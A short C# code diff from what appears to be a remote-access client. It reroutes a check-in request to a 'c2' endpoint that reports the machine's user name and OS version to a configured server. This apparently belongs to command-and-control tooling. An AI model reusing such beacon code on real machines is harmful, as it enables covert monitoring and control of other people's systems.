@@ -19,12 +19,8 @@ namespace nucleus_remote_client.Client
 
         public async Task ExecuteAsync(HostSettings hostSettings)
         {
-            HttpClient client = new()
-            {
-                BaseAddress = new Uri(hostSettings.BaseUrl ?? ""),
-            };
-
-            var _response = await client.PutAsJsonAsync("clients", new
+            var client = ClientHelper.GetHttpClient(hostSettings);
+            _ = await client.PutAsJsonAsync("c2", new
             {
                 username = Environment.UserName,
                 os = Environment.OSVersion.VersionString,
